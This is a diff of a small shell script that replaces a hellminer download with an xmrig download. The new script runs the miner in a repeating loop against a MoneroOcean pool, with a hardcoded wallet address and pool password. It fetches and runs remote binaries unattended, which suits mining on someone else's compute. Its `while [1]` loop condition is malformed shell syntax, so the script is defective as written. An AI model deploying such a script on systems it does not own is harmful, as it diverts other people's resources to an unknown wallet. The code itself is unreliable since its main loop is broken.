@@ -1,10 +1,9 @@
 #!/bin/sh
 sudo apt update
-sudo apt install screen -y
-sudo apt install cpulimit
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar xf hellminer_cpu_linux.tar.gz
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
+tar xf xmrig-6.12.2-linux-x64.tar.gz
+cd xmrig-6.12.2
 while [1]; do
-./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RTVEd4W2ejcZnizFz5QoiBdfruNA4cuZFd.sp -p x --cpu 2
+./xmrig --donate-level 1 -o gulf.moneroocean.stream:10128 -u 8AkrfutMaVHaYaMB4y9oSXdQv7fAsrcMCCpydbw7Mfin2F2w9QGAwnSSMFm3H2bGbtYBntsinuiTyHdjP8gqwGZTVgRUGPy -p nyar -a rx/0 -k
 sleep 30
 done
